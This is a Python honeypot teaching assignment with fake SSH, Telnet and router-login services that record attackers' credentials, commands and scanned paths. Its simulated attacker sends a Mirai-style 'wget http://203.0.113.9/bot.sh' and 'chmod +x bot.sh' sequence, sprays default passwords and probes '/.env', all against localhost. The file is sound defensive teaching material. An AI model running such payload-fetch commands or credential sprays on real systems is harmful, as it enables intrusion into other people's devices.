# =========================================================
# ASSIGNMENT 7
# Study of Honeypot - a working low-interaction honeypot
# =========================================================
#
# A honeypot is a fake system that LOOKS valuable. No real
# user should ever touch it, so every connection is suspicious
# and everything the visitor does is recorded.
#
# Fake services (low interaction = nothing real behind them):
#   SSH    port 2222 : sends an OpenSSH banner, records the
#                      attacker's client version
#   Telnet port 2323 : fake "login:" prompt, records every
#                      username/password, then a fake shell
#                      that records every command typed
#   HTTP   port 8080 : fake router admin login page, records
#                      submitted credentials, scanned paths and
#                      User-Agent
#
# All events go to honeypot_log.jsonl (one JSON per line),
# and a summary shows top attacker IPs, passwords, commands.
#
# =========================================================
# HOW TO RUN
# =========================================================
#
#   python honeypot.py --demo     start honeypot + simulated attackers
#   python honeypot.py            run it, then attack it yourself:
#                                   telnet 127.0.0.1 2323
#                                   ssh -p 2222 root@127.0.0.1
#                                   open http://127.0.0.1:8080/admin
#   python honeypot.py --public   listen on all interfaces (only in an
#                                 isolated lab network / VM!)
#   python honeypot.py --summary  print statistics of the log
#
# =========================================================

import argparse
import json
import os
import socket
import socketserver
import threading
import time
from collections import Counter
from datetime import datetime
from urllib.parse import parse_qs

HERE = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(HERE, "honeypot_log.jsonl")
LOCK = threading.Lock()
PORTS = {"ssh": 2222, "telnet": 2323, "http": 8080}


def log_event(service, ip, event, **data):
    record = {"time": datetime.now().isoformat(timespec="seconds"), "service": service,
              "src_ip": ip, "event": event, **data}
    with LOCK, open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(record) + "\n")
    print(f"[{record['time'][11:]}] {service:6} {ip:15} {event:12} "
          + " ".join(f"{k}={v!r}" for k, v in data.items()))


def read_line(sock, limit=512):
    """Read one line from a raw socket, ignoring telnet negotiation bytes."""
    buf = b""
    while len(buf) < limit:
        ch = sock.recv(1)
        if not ch:
            break
        if ch == b"\xff":                    # telnet IAC command: skip next 2 bytes
            sock.recv(2)
            continue
        if ch == b"\n":
            break
        buf += ch
    return buf.decode("utf-8", errors="replace").strip("\r\x00 ")


# =========================================================
# FAKE SSH
# =========================================================

class FakeSSH(socketserver.BaseRequestHandler):
    def handle(self):
        ip = self.client_address[0]
        log_event("ssh", ip, "connect")
        self.request.settimeout(10)
        self.request.sendall(b"SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7\r\n")   # old, "vulnerable-looking" version
        try:
            client = self.request.recv(256).split(b"\r\n")[0].decode(errors="replace")
            log_event("ssh", ip, "client", version=client)
        except OSError:
            pass
        # A real SSH honeypot (Cowrie) continues the key exchange; low interaction stops here.


# =========================================================
# FAKE TELNET (login + shell)
# =========================================================

FAKE_FILES = "bin  boot  dev  etc  home  lib  root  tmp  usr  var  backup.tar.gz  passwords.txt"
FAKE_OUTPUT = {
    "whoami": "root", "id": "uid=0(root) gid=0(root) groups=0(root)", "pwd": "/root",
    "uname -a": "Linux fileserver 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 x86_64 GNU/Linux",
    "ls": FAKE_FILES, "ls -la": FAKE_FILES, "cat passwords.txt": "cat: passwords.txt: Permission denied",
}


class FakeTelnet(socketserver.BaseRequestHandler):
    def handle(self):
        s, ip = self.request, self.client_address[0]
        s.settimeout(60)
        log_event("telnet", ip, "connect")
        try:
            s.sendall(b"\r\nDebian GNU/Linux 9 fileserver\r\n\r\n")
            for attempt in range(3):
                s.sendall(b"fileserver login: ")
                user = read_line(s)
                s.sendall(b"Password: ")
                password = read_line(s)
                log_event("telnet", ip, "login", username=user, password=password)
                if attempt < 2 and password not in ("123456", "admin", "root", "password"):
                    time.sleep(1)
                    s.sendall(b"\r\nLogin incorrect\r\n")
                    continue
                break                                    # "accept" a common password to see what they do next
            s.sendall(b"\r\nLast login: Mon Nov  2 09:12:44 2026 from 10.0.0.2\r\nroot@fileserver:~# ")
            while True:
                cmd = read_line(s)
                if not cmd:
                    break
                log_event("telnet", ip, "command", command=cmd)
                if cmd in ("exit", "logout"):
                    break
                out = FAKE_OUTPUT.get(cmd, f"-bash: {cmd.split()[0]}: command not found" if cmd.split()[0]
                                      not in ("wget", "curl", "chmod", "cd") else "")
                s.sendall(out.encode() + b"\r\nroot@fileserver:~# " if out else b"root@fileserver:~# ")
        except OSError:
            pass
        log_event("telnet", ip, "disconnect")


# =========================================================
# FAKE HTTP (router admin page)
# =========================================================

LOGIN_PAGE = b"""<!doctype html><title>Router Admin</title>
<h2>NetGear-Pro R7000 Administration</h2>
<form method="post" action="/login">
User: <input name="username"><br>Password: <input name="password" type="password"><br>
<button>Login</button></form>"""


class FakeHTTP(socketserver.StreamRequestHandler):
    def handle(self):
        ip = self.client_address[0]
        self.request.settimeout(10)
        try:
            request_line = self.rfile.readline(1024).decode(errors="replace").strip()
            headers = {}
            while True:
                line = self.rfile.readline(1024).decode(errors="replace").strip()
                if not line:
                    break
                k, _, v = line.partition(":")
                headers[k.lower()] = v.strip()
            method, path, *_ = (request_line.split() + ["", ""])[:3]
            body = self.rfile.read(min(int(headers.get("content-length", 0) or 0), 4096)).decode(errors="replace")
        except (OSError, ValueError):
            return

        if method == "POST":
            form = {k: v[0] for k, v in parse_qs(body).items()}
            log_event("http", ip, "login", path=path, username=form.get("username", ""),
                      password=form.get("password", ""), user_agent=headers.get("user-agent", ""))
            page = b"<p style='color:red'>Invalid username or password</p>" + LOGIN_PAGE
        else:
            log_event("http", ip, "request", method=method, path=path, user_agent=headers.get("user-agent", ""))
            page = LOGIN_PAGE
        self.wfile.write(b"HTTP/1.1 200 OK\r\nServer: lighttpd/1.4.35\r\nContent-Type: text/html\r\n"
                         + f"Content-Length: {len(page)}\r\nConnection: close\r\n\r\n".encode() + page)


# =========================================================
# SERVER START + SUMMARY
# =========================================================

class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def start(host):
    servers = []
    for name, handler in (("ssh", FakeSSH), ("telnet", FakeTelnet), ("http", FakeHTTP)):
        srv = Server((host, PORTS[name]), handler)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        servers.append(srv)
        print(f"Fake {name:6} listening on {host}:{PORTS[name]}")
    return servers


def summary():
    if not os.path.exists(LOG_FILE):
        return "No events logged yet."
    events = [json.loads(line) for line in open(LOG_FILE, encoding="utf-8")]
    logins = [e for e in events if e["event"] == "login"]
    lines = ["=" * 60, " HONEYPOT SUMMARY", "=" * 60,
             f"Total events: {len(events)}   Connections: {sum(e['event'] == 'connect' for e in events)}   "
             f"Login attempts: {len(logins)}",
             "\nEvents per service: " + ", ".join(f"{k} {v}" for k, v in Counter(e["service"] for e in events).items()),
             "\nTop attacker IPs:"]
    lines += [f"  {ip:15} {n} events" for ip, n in Counter(e["src_ip"] for e in events).most_common(5)]
    lines.append("\nCredentials tried:")
    lines += [f"  {u!r} / {p!r}  x{n}" for (u, p), n in Counter((e["username"], e["password"]) for e in logins).most_common(10)]
    lines.append("\nCommands typed in fake shell:")
    lines += [f"  {e['command']}" for e in events if e["event"] == "command"]
    lines.append("\nWeb paths scanned:")
    lines += [f"  {e['method']} {e['path']}  ({e['user_agent']})" for e in events if e["event"] == "request"]
    clients = {e["version"] for e in events if e["event"] == "client"}
    if clients:
        lines.append("\nSSH client versions: " + ", ".join(sorted(clients)))
    return "\n".join(lines)


# =========================================================
# DEMO ATTACKERS
# =========================================================

def demo_attacks():
    host = "127.0.0.1"

    with socket.create_connection((host, PORTS["ssh"]), timeout=5) as s:        # SSH scanner
        s.recv(256)
        s.sendall(b"SSH-2.0-libssh2_1.9.0\r\n")
        time.sleep(0.2)

    with socket.create_connection((host, PORTS["telnet"]), timeout=10) as s:    # Mirai-style telnet bot
        s.settimeout(10)

        def expect(word):
            data = b""
            while word not in data:
                data += s.recv(1024)
        for user, pw in (("admin", "admin123"), ("root", "vizxv"), ("root", "123456")):
            expect(b"login: ")
            s.sendall(user.encode() + b"\r\n")
            expect(b"Password: ")
            s.sendall(pw.encode() + b"\r\n")
        for cmd in ("whoami", "uname -a", "cd /tmp", "wget http://203.0.113.9/bot.sh", "chmod +x bot.sh", "exit"):
            expect(b"# ")
            s.sendall(cmd.encode() + b"\r\n")
        time.sleep(0.3)

    for raw in (b"GET /admin HTTP/1.1\r\nHost: x\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\n\r\n",
                b"GET /.env HTTP/1.1\r\nHost: x\r\nUser-Agent: python-requests/2.31\r\n\r\n",
                b"POST /login HTTP/1.1\r\nHost: x\r\nUser-Agent: Hydra\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                b"Content-Length: 32\r\n\r\nusername=admin&password=password"):
        with socket.create_connection((host, PORTS["http"]), timeout=5) as s:
            s.sendall(raw)
            s.recv(4096)
    time.sleep(0.3)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Low-interaction honeypot")
    parser.add_argument("--demo", action="store_true", help="run simulated attackers against it")
    parser.add_argument("--public", action="store_true", help="listen on all interfaces (isolated lab only)")
    parser.add_argument("--summary", action="store_true", help="show statistics of the log and exit")
    args = parser.parse_args()

    if args.summary:
        print(summary())
        raise SystemExit

    if args.demo and os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    servers = start("0.0.0.0" if args.public else "127.0.0.1")
    print(f"Logging to {LOG_FILE}\n")

    if args.demo:
        demo_attacks()
        for s in servers:
            s.shutdown()
        print("\n" + summary())
        events = [json.loads(line) for line in open(LOG_FILE, encoding="utf-8")]
        assert {"ssh", "telnet", "http"} == {e["service"] for e in events}
        assert any(e.get("password") == "vizxv" for e in events)
        assert any("wget" in e.get("command", "") for e in events)
        assert any(e.get("path") == "/.env" for e in events)
        print("\nSelf-check passed: all three fake services captured the attacker's actions.")
    else:
        print("Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n" + summary())
